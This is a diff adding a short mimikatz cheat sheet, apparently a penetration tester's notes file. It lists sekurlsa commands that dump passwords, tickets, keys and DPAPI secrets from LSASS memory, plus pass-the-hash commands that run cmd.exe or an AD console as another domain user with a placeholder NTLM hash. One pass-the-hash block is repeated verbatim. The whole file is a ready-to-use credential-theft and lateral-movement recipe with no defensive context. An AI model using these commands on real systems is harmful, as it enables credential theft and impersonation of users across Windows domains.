@@ -1,0 +1,20 @@
+#If you do not have NT Authority\System this mimikatz will fail. Also most AV will pick up the mimikatz.exe file
+
+#Find passwords
+mimikatz # sekurlsa::searchPasswords
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::tickets /export
+mimikatz # sekurlsa::ekeys
+mimikatz # sekurlsa::dpapi
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::kerberos
+mimikatz # sekurlsa::msv
+
+#Execute cmd.exe as a specific user (pass the hash)
+mimikatz # sekurlsa::pth /user:firtname.lastname /domain:COMPANYDOMAIN /ntlm:cc36cf7a8514893efccd332446158b1a
+
+#Execute cmd.exe as a specific user (pass the hash)
+mimikatz # sekurlsa::pth /user:firtname.lastname /domain:COMPANYDOMAIN /ntlm:cc36cf7a8514893efccd332446158b1a
+
+#Execute any binary as a specific user (i.e. Active Directory Users & Computers)
+mimikatz # sekurlsa::pth /user:firtname.lastname /domain:COMPANYDOMAIN /ntlm:cc36cf7a8514893efccd332446158b1a /run:DSA.MSC
